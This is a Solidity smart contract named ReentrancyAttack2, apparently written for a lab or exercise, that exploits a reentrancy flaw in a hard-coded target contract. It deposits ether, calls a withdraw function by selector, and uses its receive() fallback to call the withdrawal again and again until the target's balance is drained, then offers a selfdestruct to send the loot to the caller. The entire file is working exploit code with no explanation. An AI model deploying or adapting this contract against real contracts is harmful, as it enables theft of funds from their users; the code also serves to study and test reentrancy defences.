// SPDX-License-Identifier: MIT

pragma solidity ^0.7.0;

contract ReentrancyAttack2 {
    
    address _reentrancy = 0xDA0bab807633f07f013f94DD0E6A4F96F8742B53; // <reentrancy_address>
    bytes4 selector1 = 0x5218195a;
    bytes4 selector2 = 0x7362377b;

    function attack() public payable {
        
        bytes memory data = abi.encodeWithSelector(selector1);
        
        (bool success, ) = address(_reentrancy).call{value: 100000000 gwei}(data);
        require(success);

        bytes memory data2 = abi.encodeWithSelector(selector2);
        (bool success2, ) = address(_reentrancy).call(data2);
        require(success2);
    }
    
    function getBalance() public view returns(uint) {
        return address(this).balance;
    }
    
    function kill() public{
        selfdestruct(msg.sender);
    }
    
    receive() external payable {
        if (address(_reentrancy).balance >= msg.value) {
            bytes memory data2 = abi.encodeWithSelector(selector2);
            (bool success2, ) = address(_reentrancy).call(data2);
            require(success2);
        }
    }
}
